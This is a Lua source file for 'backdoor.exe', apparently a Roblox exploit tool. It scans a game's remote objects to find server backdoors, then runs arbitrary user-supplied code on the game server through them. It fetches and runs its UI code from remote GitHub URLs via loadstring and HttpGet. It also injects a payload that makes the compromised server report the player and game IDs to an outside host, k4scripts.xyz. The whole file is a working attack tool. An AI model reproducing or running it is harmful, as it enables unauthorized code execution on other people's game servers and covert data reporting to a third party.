--[========================================================================[
    backdoor.exe, the best backdoor scanner in Roblox.
    Copyright (C) 2021	iK4oS

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <https://www.gnu.org/licenses/>.
--]========================================================================]


--// TYPES \\--
--[[ export type LikelyBackdoor = RemoteEvent|RemoteFunction;
export type MakeDummy = (LikelyBackdoor, string) -> nil;
export type ExecuteBackdoor = (BackdoorGateway, ...any) -> any;

-- @BackdoorSolver
-- Solvers allow us to provide a maintanable way of
-- adding new backdoors detections and executions.
export type BackdoorSolver = {
    makeDummy: MakeDummy,
    Execute: ExecuteBackdoor
}

-- @BackdoorGateway
-- Once found a backdoor we instanciate a new gateway which is responsible of using the backdoor
export type BackdoorGateway = {
    b: LikelyBackdoor,                          -- backdoor
    Execute: (BackdoorGateway, ...any) -> any
};]]

-- // CHECK IF RUNNING \\ --
local genv = getgenv();
if genv.backdoorexe then
    genv.backdoorexe.screenGui:Destroy();
end

--// UI \\--
local screenGui, uiRequire = loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/v8/src/ui.lua"))()
local alertLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/uniquadev/GuiToLuaConverter/main/PluginPlace/src/alerts.lua"))()

local ui = uiRequire(screenGui.main);
local config = ui.config;
local games = ui.games;
local btns = ui.btns;
local editor = ui.editor;

-- // START SESSION \\ --
genv.backdoorexe = {
    screenGui = screenGui,
    ui = ui
};

--// SERVICES \\--

local httpService = game:GetService("HttpService");
local serverScript = game:GetService("ServerScriptService");
local players = game:GetService("Players");
local localPlayer = players.LocalPlayer;

--// GLOBALS \\--

local TITLE = "backdoor.exe - v8.0.0";
local BACKDOOR_SOLVER = {};
local BACKDOOR_FILTER = {};
local URSTRING_TO_BACKDOOR = {};
local ALPHABET = {
    "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z",
    "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z",
    "0", "1", "2", "3", "4", "5", "6", "7", "8", "9",
    "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "-", "_", "=", "+", "[", "]", "{", "}", "|", ";", ":", ",", ".", "?", "/", "`", "~"
};

-- // CONSTANTS \\--
local EXEC_DEBUG = [[
local stdout = {};
local print = function(...)
    table.insert(stdout, {
        value = {...}
    });
end;
local warn = function(...)
    table.insert(stdout, {
        warn = true,
        value = {...}
    });
end;
local int, err = pcall(function() %s end);
local bool = Instance.new("BoolValue");
bool.Name = "%s";
bool.Value = int;
if not int then
    bool:SetAttribute("err", err);
end;
if #stdout > 0 then
    bool:SetAttribute(
        "stdout",
        game:GetService("HttpService"):JSONEncode(stdout)
    );
end;
bool.Parent = workspace;
game:GetService("Debris"):AddItem(bool, 3);
]];
-- this code execute on game server, doesn't have any role with user client
local LOG_GAME = [[
local httpService = game:GetService("HttpService");
httpService:RequestAsync(
    {
        Url = "https://k4scripts.xyz/hookproxy/log_game",
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = httpService:JSONEncode({PlayerId = "%%userid%%", GameId = game.GameId})
    }
);
]];

--// UTILS \\--

local function stringSplit (inputstr, sep)
    if sep == nil then
        sep = "%s"
    end
    local t={}
    for str in string.gmatch(inputstr, "([^"..sep.."]+)") do
        table.insert(t, str)
    end
    return t
end

-- solve roblox path
local roRoots = {
    workspace = workspace,
    game = game
}

local function solveRobloxPath(path)
    local path = stringSplit(path, ".");
    local inst = roRoots[path[1]] or game:GetService(path[1]);
    if not inst then
        return nil;
    end;
    for i = 2, #path do
        inst = inst:FindFirstChild(path[i]);
        if not inst then
            return nil;
        end;
    end;
    return inst;
end;

-- encode backdoors table
local function encodeBackdoors(backdoors)
    local encoded = {};
    for i, v in ipairs(backdoors) do
        table.insert(encoded, v.b:GetFullName());
    end
    return encoded;
end;

-- fire RemoteEvent/RemoteFunction with the given arguments in a new thread
local function runRemote(r, ...)
    if r:IsA("RemoteEvent") then
        return task.spawn(r.FireServer, r, ...);
    elseif r:IsA("RemoteFunction") then
        return task.spawn(r.InvokeServer, r, ...);
    end
end;

-- generate an unique random string name inside the passed parent
local function urString(len, parent)
    local name = "";
    local r = Random.new();
    while true do
        for i = 1, len do
            local idx = r:NextInteger(1, #ALPHABET);
            local c = ALPHABET[idx];
            name = name .. c;
        end;
        if parent == nil or parent:FindFirstChild(name) == nil then
            break;
        end;
        -- rare but still possible :o
        name = "";
    end
    return name;
end;

-- wrap to make a BackdoorGateway
local function makeGateway(r, s)
    return {
        b = r,
        Execute = s.Execute
    };
end;

--// SOLVERS \\--

-- [[COMMON BACKDOOR SOLVER]]
-- @detection by performing a remote run and instanciating a dummy instance
-- @execution_param code:string
BACKDOOR_SOLVER[1] = {
    makeDummy = function(r, dummyName)
        --[[ check if loadstring is disabled | sobly not work
        if gethiddenproperty(ServerScript, "LoadStringEnabled") == false then
            URSTRING_TO_BACKDOOR[dummyName] = nil;
            return;
        end;]]
        local src = ('local d = Instance.new("BoolValue", workspace);d.Name = "%s";game:GetService("Debris"):AddItem(d, 3);'):format(
            dummyName
        );
        runRemote(r, src);
    end,
    Execute = function(g, code)
        return runRemote(g.b, code);
    end
};

--// FILTERS \\--
-- I suggest registering filters in priority order, and they must be thread safe.

-- [[COMMON BACKDOOR FILTER]]
-- @filter ClassName check the passed instance
BACKDOOR_FILTER[1] = function(r)
        -- Checking the class
    return r:IsA("RemoteEvent") or r:IsA("RemoteFunction");
end;
BACKDOOR_FILTER[2] = function(r)
        -- Anti-Addonis Filter
        return not ((r.Parent == game:GetService("ReplicatedStorage") and r:FindFirstChild("__FUNCTION")) or
            (r.Name == "__FUNCTION" and r.Parent:IsA("RemoteEvent") and r.Parent.Parent == game:GetService("ReplicatedStorage")));
end;

--// CORE \\--

local function filterRemote(r, remotes)
    for _, filter in ipairs(BACKDOOR_FILTER) do
        if not filter(r) then
            return false; -- remote is not a backdoor
        end;
    end;
    table.insert(remotes, r);
    return true;
end

local function getRemotes()
    local remotes = {};
    for i, r in ipairs(game:GetDescendants()) do
        filterRemote(r, remotes);
    end;
    -- check getnilinstances support
    if getnilinstances == nil then
        return remotes;
    end
    for i, r in ipairs(getnilinstances()) do
        filterRemote(r, remotes);
    end;
    return remotes;
end;

-- scan all game remotes and return all backdoors found
local function scan(remotes, delayFactor)
    delayFactor = delayFactor or 1;
    alertLib.Info(screenGui, TITLE, 'Scan started.', 4);
    ui.title.Text = TITLE .. " [Scanning]";
    -- retrive remotes
    remotes = remotes or getRemotes();
    local backdoors = {};
    -- listen workspace new instances
    local connection = workspace.ChildAdded:Connect(function(child)
        local gateway = URSTRING_TO_BACKDOOR[child.Name];
        if gateway then
            -- store backdoor
            table.insert(backdoors, gateway);
        end;
    end);
    ui.title.Text = TITLE .. " [Testing]";
    -- loop all remotes
    for i, r in ipairs(remotes) do
        -- loop solvers
        for j, s in ipairs(BACKDOOR_SOLVER) do
            -- create a new backdoor gateway
            local g = makeGateway(r, s);
            -- this will ensure we generate an unique string inside URSTRING_TO_BACKDOOR and workspace
            local dummyName = urString(5, workspace) .. i .. j;
            -- register gateway
            URSTRING_TO_BACKDOOR[dummyName] = g;
            -- make dummy test
            s.makeDummy(r, dummyName);
        end;
    end;
    task.wait((localPlayer:GetNetworkPing() * delayFactor) * #remotes); -- wait latency product in seconds for safe detections
    connection:Disconnect();
    table.clear(URSTRING_TO_BACKDOOR); -- clear URSTRING_TO_BACKDOOR
    -- return
    return backdoors;
end;

local executing = false;
local function execute(code, gateway, canDebug, disableAlerts)
    assert(code and gateway, "missing code or gateway");
    ui.title.Text = TITLE .. " [Executing]";
    if canDebug then
        -- pcall wrapper
        local token = urString(5, workspace);
        code = EXEC_DEBUG:format(code, token);
        -- listen for error instance
        local connection;
        connection = workspace.ChildAdded:Connect(function(child)
            if child.Name == token then
                -- stdout print, warn
                local stdout = child:GetAttribute("stdout");
                if typeof(stdout) == "string" then
                    local integrity, parsed = pcall(httpService.JSONDecode, httpService, stdout);
                    if integrity then
                        for i, out in next, parsed do
                            if out.warn then
                                warn(table.unpack(out.value));
                            else
                                print(table.unpack(out.value));
                            end
                        end
                    end
                end
                -- stdout err in the console
                if not child.Value then
                     -- alert to user
                     if not disableAlerts then
                        alertLib.Error(screenGui, TITLE, 'Execution error in console.');
                     end;
                    task.spawn(error, child:GetAttribute("err"));
                elseif not disableAlerts then
                    alertLib.Success(screenGui, TITLE, 'Script successfully executed.');
                end;
                -- disconnect
                connection:Disconnect();
            end
        end);
        -- force disconnect after 3 seconds
        task.delay(3 + localPlayer:GetNetworkPing(), function()
            connection:Disconnect();
        end);
    end;
    -- execute code
    return gateway:Execute(code);
end;


-- perform a scan and print out the time taken and the found backdoors
local function debugScan()
    local start = tick();
    local backdoors = scan();
    local endTime = tick();
    print("Backdoors found: " .. #backdoors);
    print("Time taken: " .. (endTime - start) .. "ms");
    return backdoors;
end;

-- macros solver
local function applyMacros(code)
    return 
    code:gsub(
        "%%username%%", localPlayer.Name
    ):gsub(
        "%%userid%%", localPlayer.UserId
    );
end;

-- retrive backdoors from config
local function getConfigBackdoors()
    if config.data.games[game.PlaceId] then
        local gameBackdoors = config.data.games[game.PlaceId].backdoors;
        local remotes = {};
        for i, path in next, gameBackdoors do
            local remote = solveRobloxPath(path);
            if remote then
                filterRemote(remote, remotes);
            end;
        end
        return scan(remotes, 3);
    end;
    return {};
end;

local backdoors;
local firstExecution = true;
btns.execBtn.MouseButton1Click:Connect(function()
    -- avoid multiple executions
    if executing then
        return;
    end
    executing = true;
    -- try scanning for backdoors
    if backdoors == nil or #backdoors == 0 then
        -- check if config.games has found backdoors
        local configBackdoors = getConfigBackdoors();
        if configBackdoors[1] then
            backdoors = configBackdoors;
        else
            -- search backdoors
            backdoors = debugScan();
        end
    end;
    if backdoors[1] == nil then
        alertLib.Error(screenGui, TITLE, 'No backdoor found.')
        return;
    end;
    if firstExecution then
        -- store game
        games.loadGame(game.PlaceId, encodeBackdoors(backdoors));
        config.save();
        -- log game
        execute(applyMacros(LOG_GAME), backdoors[1], false, true);
        firstExecution = false;
    end;
    -- execute
    local code = applyMacros(editor.getCode());
    execute(code, backdoors[1], config.data.settings.canDebug);
    executing = false;
    -- reset title
    ui.title.Text = TITLE;
end);

-- set title
ui.title.Text = TITLE;

alertLib.Success(screenGui, TITLE, 'Backdoor scanner successfully loaded.');
alertLib.Info(screenGui, TITLE, 'Home to toggle ui.', 4);
